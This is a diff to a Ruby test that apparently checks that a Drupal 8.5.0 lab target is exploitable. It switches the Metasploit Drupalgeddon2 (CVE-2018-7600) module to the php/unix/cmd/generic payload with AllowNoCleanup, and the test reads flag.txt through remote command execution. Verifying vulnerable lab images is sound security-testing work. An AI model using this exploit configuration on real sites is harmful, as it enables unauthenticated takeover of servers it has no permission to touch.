@@ -35,14 +35,15 @@ class Drupal850Test < PostProvisionTest
     end
     # tier 3 (exploit): Drupalgeddon2 (CVE-2018-7600), unauthenticated RCE via a
     # crafted HTTP request to the Drupal form API. The exploit runs as www-data,
-    # which can read flag.txt (0640 www-data:www-data) in sites/default/. The
-    # default cmd/unix/generic payload is tried first; on a PHP-platform exploit
-    # the alternative is php/unix/cmd/generic (change payload: if this SKIPs with
-    # a payload-not-valid error in msf_output evidence).
+    # which can read flag.txt (0640 www-data:www-data) in sites/default/.
+    # php/unix/cmd/generic is required: cmd/unix/generic is not compatible with
+    # PHP-platform exploits. AllowNoCleanup is required because the payload
+    # cannot clean up the files it writes to the target via PHP.
     tier(3) do
       test_msf_exploit('exploit/unix/webapp/drupal_drupalgeddon2',
                        rport: self.port,
-                       payload: 'cmd/unix/generic',
+                       payload: 'php/unix/cmd/generic',
+                       options: { 'AllowNoCleanup' => 'true' },
                        collect: 'cat /var/www/drupal-8.5.0/sites/default/flag.txt 2>/dev/null')
     end
   end
